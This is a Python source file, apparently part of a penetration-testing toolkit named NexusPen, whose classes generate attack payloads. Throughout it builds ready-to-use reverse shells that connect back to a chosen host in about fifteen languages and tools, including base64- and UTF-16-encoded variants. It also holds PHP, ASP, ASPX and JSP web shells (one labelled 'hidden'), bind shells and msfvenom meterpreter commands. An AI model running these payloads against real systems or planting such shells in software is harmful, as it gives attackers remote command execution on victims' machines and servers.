#!/usr/bin/env python3
"""
NexusPen - Payload Generator Module
====================================
Reverse shell and payload generation utilities.
"""

import base64
import urllib.parse
from typing import Dict, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class Payload:
    """Generated payload."""
    name: str
    payload: str
    language: str
    encoded: bool = False


class PayloadGenerator:
    """
    Generate various payloads for exploitation.
    """
    
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
    
    def bash_reverse_shell(self) -> Payload:
        """Generate Bash reverse shell."""
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        return Payload(name="Bash Reverse Shell", payload=payload, language="bash")
    
    def bash_reverse_shell_base64(self) -> Payload:
        """Generate Base64 encoded Bash reverse shell."""
        cmd = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        encoded = base64.b64encode(cmd.encode()).decode()
        payload = f"echo {encoded} | base64 -d | bash"
        return Payload(name="Bash Base64", payload=payload, language="bash", encoded=True)
    
    def python_reverse_shell(self) -> Payload:
        """Generate Python reverse shell."""
        payload = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''
        return Payload(name="Python3 Reverse Shell", payload=payload, language="python")
    
    def python2_reverse_shell(self) -> Payload:
        """Generate Python2 reverse shell."""
        payload = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''
        return Payload(name="Python2 Reverse Shell", payload=payload, language="python")
    
    def nc_reverse_shell(self) -> Payload:
        """Generate Netcat reverse shell."""
        payload = f"nc -e /bin/sh {self.lhost} {self.lport}"
        return Payload(name="Netcat -e", payload=payload, language="bash")
    
    def nc_mkfifo_reverse_shell(self) -> Payload:
        """Generate Netcat mkfifo reverse shell."""
        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f"
        return Payload(name="Netcat FIFO", payload=payload, language="bash")
    
    def php_reverse_shell(self) -> Payload:
        """Generate PHP reverse shell."""
        payload = f'''php -r '$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");' '''
        return Payload(name="PHP Reverse Shell", payload=payload, language="php")
    
    def perl_reverse_shell(self) -> Payload:
        """Generate Perl reverse shell."""
        payload = f'''perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        return Payload(name="Perl Reverse Shell", payload=payload, language="perl")
    
    def ruby_reverse_shell(self) -> Payload:
        """Generate Ruby reverse shell."""
        payload = f'''ruby -rsocket -e'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
        return Payload(name="Ruby Reverse Shell", payload=payload, language="ruby")
    
    def powershell_reverse_shell(self) -> Payload:
        """Generate PowerShell reverse shell."""
        payload = f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
        return Payload(name="PowerShell Reverse Shell", payload=payload, language="powershell")
    
    def powershell_base64(self) -> Payload:
        """Generate Base64 encoded PowerShell reverse shell."""
        ps_cmd = f'''$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        
        # UTF-16LE encoding for PowerShell
        encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        payload = f"powershell -nop -enc {encoded}"
        
        return Payload(name="PowerShell Base64", payload=payload, language="powershell", encoded=True)
    
    def java_reverse_shell(self) -> Payload:
        """Generate Java reverse shell."""
        payload = f'''Runtime r = Runtime.getRuntime();String cmd[] = {{"/bin/bash","-c","bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"}};Process p = r.exec(cmd);'''
        return Payload(name="Java Reverse Shell", payload=payload, language="java")
    
    def groovy_reverse_shell(self) -> Payload:
        """Generate Groovy reverse shell (for Jenkins)."""
        payload = f'''String host="{self.lhost}";int port={self.lport};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();'''
        return Payload(name="Groovy Reverse Shell", payload=payload, language="groovy")
    
    def lua_reverse_shell(self) -> Payload:
        """Generate Lua reverse shell."""
        payload = f'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.lhost}',{self.lport});os.execute('/bin/sh -i <&3 >&3 2>&3');"'''
        return Payload(name="Lua Reverse Shell", payload=payload, language="lua")
    
    def nodejs_reverse_shell(self) -> Payload:
        """Generate Node.js reverse shell."""
        payload = f'''node -e "require('child_process').exec('bash -c \\"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\\"')"'''
        return Payload(name="Node.js Reverse Shell", payload=payload, language="javascript")
    
    def socat_reverse_shell(self) -> Payload:
        """Generate Socat reverse shell."""
        payload = f"socat tcp-connect:{self.lhost}:{self.lport} exec:/bin/sh,pty,stderr,setsid,sigint,sane"
        return Payload(name="Socat Reverse Shell", payload=payload, language="bash")
    
    def awk_reverse_shell(self) -> Payload:
        """Generate Awk reverse shell."""
        payload = f'''awk 'BEGIN {{s = "/inet/tcp/0/{self.lhost}/{self.lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null'''
        return Payload(name="Awk Reverse Shell", payload=payload, language="awk")
    
    def generate_all(self) -> list:
        """Generate all available payloads."""
        console.print(f"\n[cyan]🔧 Generating payloads for {self.lhost}:{self.lport}[/cyan]")
        
        payloads = [
            self.bash_reverse_shell(),
            self.bash_reverse_shell_base64(),
            self.python_reverse_shell(),
            self.nc_mkfifo_reverse_shell(),
            self.php_reverse_shell(),
            self.perl_reverse_shell(),
            self.ruby_reverse_shell(),
            self.powershell_reverse_shell(),
            self.powershell_base64(),
            self.nodejs_reverse_shell(),
            self.socat_reverse_shell(),
        ]
        
        return payloads
    
    def display_payloads(self, payloads: list = None):
        """Display all payloads."""
        if payloads is None:
            payloads = self.generate_all()
        
        for p in payloads:
            console.print(f"\n[bold cyan]═══ {p.name} ═══[/bold cyan]")
            console.print(f"[dim]{p.payload}[/dim]")


class WebShellGenerator:
    """Generate web shells for various languages."""
    
    @staticmethod
    def php_simple() -> str:
        """Simple PHP web shell."""
        return '<?php system($_GET["cmd"]); ?>'
    
    @staticmethod
    def php_hidden() -> str:
        """Hidden PHP web shell."""
        return '<?php @eval($_POST["x"]); ?>'
    
    @staticmethod
    def php_full() -> str:
        """Full featured PHP web shell."""
        return '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>'''
    
    @staticmethod
    def asp_simple() -> str:
        """Simple ASP web shell."""
        return '<%eval request("cmd")%>'
    
    @staticmethod
    def aspx_simple() -> str:
        """Simple ASPX web shell."""
        return '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!String.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>'''
    
    @staticmethod
    def jsp_simple() -> str:
        """Simple JSP web shell."""
        return '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int c;
    while((c = in.read()) != -1) {
        out.print((char)c);
    }
    in.close();
}
%>'''


class BindShellGenerator:
    """Generate bind shells."""
    
    def __init__(self, lport: int):
        self.lport = lport
    
    def python_bind(self) -> str:
        """Python bind shell."""
        return f'''python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
    
    def nc_bind(self) -> str:
        """Netcat bind shell."""
        return f"nc -lvnp {self.lport} -e /bin/sh"
    
    def socat_bind(self) -> str:
        """Socat bind shell (with PTY)."""
        return f"socat TCP-LISTEN:{self.lport},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"


class MsfvenomGenerator:
    """
    Generate Metasploit payloads using msfvenom.
    """
    
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
    
    def windows_reverse_tcp(self, format: str = 'exe') -> str:
        """Windows reverse TCP meterpreter."""
        return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f {format}"
    
    def windows_reverse_https(self, format: str = 'exe') -> str:
        """Windows reverse HTTPS meterpreter (stealthier)."""
        return f"msfvenom -p windows/meterpreter/reverse_https LHOST={self.lhost} LPORT={self.lport} -f {format}"
    
    def linux_reverse_tcp(self, format: str = 'elf') -> str:
        """Linux reverse TCP meterpreter."""
        return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f {format}"
    
    def php_reverse_tcp(self) -> str:
        """PHP reverse TCP."""
        return f"msfvenom -p php/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw"
    
    def python_reverse_tcp(self) -> str:
        """Python reverse TCP."""
        return f"msfvenom -p python/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport}"
    
    def java_reverse_tcp(self, format: str = 'jar') -> str:
        """Java reverse TCP."""
        return f"msfvenom -p java/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f {format}"
    
    def aspx_reverse_tcp(self) -> str:
        """ASP.NET reverse TCP."""
        return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f aspx"
    
    def war_reverse_tcp(self) -> str:
        """WAR file for Tomcat."""
        return f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f war"
    
    def display_all(self):
        """Display all msfvenom commands."""
        console.print("\n[bold cyan]═══ MSFVENOM PAYLOADS ═══[/bold cyan]")
        console.print(f"\n[yellow]Windows EXE:[/yellow]\n{self.windows_reverse_tcp()}")
        console.print(f"\n[yellow]Windows HTTPS:[/yellow]\n{self.windows_reverse_https()}")
        console.print(f"\n[yellow]Linux ELF:[/yellow]\n{self.linux_reverse_tcp()}")
        console.print(f"\n[yellow]PHP:[/yellow]\n{self.php_reverse_tcp()}")
        console.print(f"\n[yellow]Python:[/yellow]\n{self.python_reverse_tcp()}")
        console.print(f"\n[yellow]Java JAR:[/yellow]\n{self.java_reverse_tcp()}")
        console.print(f"\n[yellow]ASPX:[/yellow]\n{self.aspx_reverse_tcp()}")
        console.print(f"\n[yellow]WAR:[/yellow]\n{self.war_reverse_tcp()}")
